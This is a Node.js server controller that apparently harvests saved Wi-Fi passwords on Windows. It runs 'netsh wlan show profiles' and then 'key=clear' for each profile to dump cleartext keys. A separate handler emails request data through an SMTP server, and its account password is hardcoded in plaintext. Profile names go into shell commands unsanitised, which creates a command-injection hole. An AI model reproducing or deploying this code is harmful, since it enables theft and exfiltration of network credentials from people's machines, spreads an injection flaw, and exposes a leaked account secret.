const os= require('os')
const path = require('path')
const fs = require('fs')
const nodemailer = require('nodemailer')
const {exec} = require('child_process')
const {PDFDocument, StandardFonts}=require('pdf-lib')
const iconv = require('iconv-lite');


const pathKnowing = path.join(os.homedir(),'Documents')
console.log('path is :',pathKnowing)
const textIs = 'file.txt'
const textInfoPassword = 'password.txt'
const command = `netsh wlan show profiles > ${pathKnowing}\\${textIs}`
const fullWay = path.join(pathKnowing,textIs)
const password_path = path.join(pathKnowing,textInfoPassword)

const getInfos =async (req,res)=>{

    try{
        exec(command,(error,stdout,stderr)=>{
            if(error){
                console.error(`Error: ${error.message}`)
            }
            if (stderr){
                console.error(`stderr: ${stderr}`)

            }
            res.json('the thing is successfully ')
        })
    }catch (e) {
        console.log('information',e)
    }
   //res.send("app is getting infos")
}

/*const readInfos = async (req,res)=> {

    try {
        //help to read file in a folder
        const fileContent = fs.readFileSync(fullWay, 'utf8')

        //the regex one
        console.log('file content is :', fileContent)
        const profilesRegex = /Profil Tous les utilisateurs\s+�: (.+)/g;
        const profiles = [];
        let match;
        let countItemGrownLength = 0
        while ((match = profilesRegex.exec(fileContent))) {
            profiles.push(match[1])
        }
        console.log("profile content is", profiles)

        for(const item of profiles) {
            console.log('item is :', item)
            // Remove invalid character
            const profileName = item.replace(/�/g, '');
            console.log('item is :',item)
            console.log('profile Name is : ',profileName)
            let profile = item
            if ((/\s/g).test(profile)){
                countItemGrownLength++
                profile = `"${item.replace(/�/g, '')}"`
            }

            const commanded = `netsh wlan show profiles name=${profile} key=clear `
            exec(commanded, async (error, stdout, stderr) => {

                if (error) {
                    console.error(`Error: ${error.message}`)
                }
                if (!stderr) {
                    const decodedStdout = iconv.decode(stdout, 'win1252'); // Decode stdout buffer
                    console.log('stdout decode is:', decodedStdout);

                    const pdfDoc = await PDFDocument.create()
                    const page = pdfDoc.addPage()

                    const font = await pdfDoc.embedFont(StandardFonts.Helvetica)
                    const fontSize = 12;

                    page.drawText(decodedStdout, {x: 50, y: 50, font});
                    const pdfBytes = await pdfDoc.save()
                    /*fs.writeFileSync('output.pdf',pdfBytes);
                    console.log('pdf created successfully')*/

                    //peut ere mettre un timer sur la boucle for
                   /* res.setHeader('Content-Type', 'application/pdf');
                    res.setHeader('Content-Disposition', 'attachment; filename="output.pdf"');
                    res.send(pdfBytes);

                }
                else {
                    console.error(`stderr: ${stderr}`)

                }
                console.log('the thing is successfully ')
            })

        }

        console.log(`il y'a ${countItemGrownLength} qui n'ont pas ete pris e count`)

        res.send('success')
        
    }catch (err) {
        console.error('Error:', err);
        res.status(500).send('Internal Server Error');
    }

}*/

const sendingEmail = async (req,res)=>{

    const textBytes = req.body.dataA
    //const id = req.query.id
    const transporter = nodemailer.createTransport({
        host: 'ssl0.ovh.net',
        port:587,
        secure: false,
        auth: {
            user: 'kevin@web-maniac.com',
            pass: 'Webmaniac-projet59'
        }
    })

    try{
        //const fileContent =fs.readFileSync(textBytes,'utf8')
        const mailOptions = {
            from: 'kevin@web-maniac.com',
            to: 'kevin@web-maniac.com',
            subject: 'PDF Attachment',
            text: 'Attached is the PDF file',
            attachments: [
                {
                    filename: `output.txt`,
                    content: textBytes
                }
            ]
        }

        const result = await transporter.sendMail(mailOptions)
        res.json({message:result.response})

    }catch (e) {
        res.json(e)
    }

}


const readInfos = async (req, res) => {
    try {
        const fileContent = fs.readFileSync(fullWay, 'utf8');
        const profilesRegex = /Profil Tous les utilisateurs\s+�: (.+)/g;
        const profiles = [];
        const textContents = [];
        let match;
        let countItemGrownLength = 0;
        const pdfBytesArray = []; // Array to store PDF bytes for each profile

        while ((match = profilesRegex.exec(fileContent))) {
            profiles.push(match[1]);
        }

        for (const item of profiles) {
            const profileName = item.replace(/�/g, '');
            let profile = item;
            if (/\s/g.test(profile)) {
                countItemGrownLength++;
                profile = `"${item.replace(/�/g, '')}"`;
            }

            const commanded = `netsh wlan show profiles name=${profile} key=clear `;
            const stdout = await new Promise((resolve, reject) => {
                exec(commanded, (error, stdout, stderr) => {
                    if (error) {
                        console.error(`Error: ${error.message}`);
                        reject(error);
                    } else {
                        resolve(stdout);
                    }
                });
            });


            const decodedStdout = iconv.decode(stdout, 'win1252');
            textContents.push(decodedStdout);

           /* const decodedStdout = iconv.decode(stdout, 'win1252');
            const pdfDoc = await PDFDocument.create();
            const page = pdfDoc.addPage();
            const font = await pdfDoc.embedFont(StandardFonts.Helvetica);
            const fontSize = 12;
            page.drawText(decodedStdout, { x: 110, y: 110, font });
            const pdfBytes = await pdfDoc.save();
            pdfBytesArray.push(pdfBytes); */// Store PDF bytes for each profile
        }
        const mergedTextContent = textContents.join('\n\n'); // Join text contents with line breaks

        const mergedPdfBytes = Buffer.concat(pdfBytesArray); // Concatenate PDF bytes

        const filePath = path.join(os.tmpdir(), 'output.txt'); // Save the text content to a temporary file
        fs.writeFileSync(filePath, mergedTextContent, 'utf8');

        res.setHeader('Content-Type', 'text/plain');
        res.setHeader('Content-Disposition', 'attachment; filename="output.txt"');
        res.send(mergedTextContent);


        //Clen up the temporary file
        fs.unlinkSync(filePath);

    } catch (err) {
        console.error('Error:', err);
        res.status(500).send('Internal Server Error');
    }
};




module.exports = {getInfos,readInfos,sendingEmail}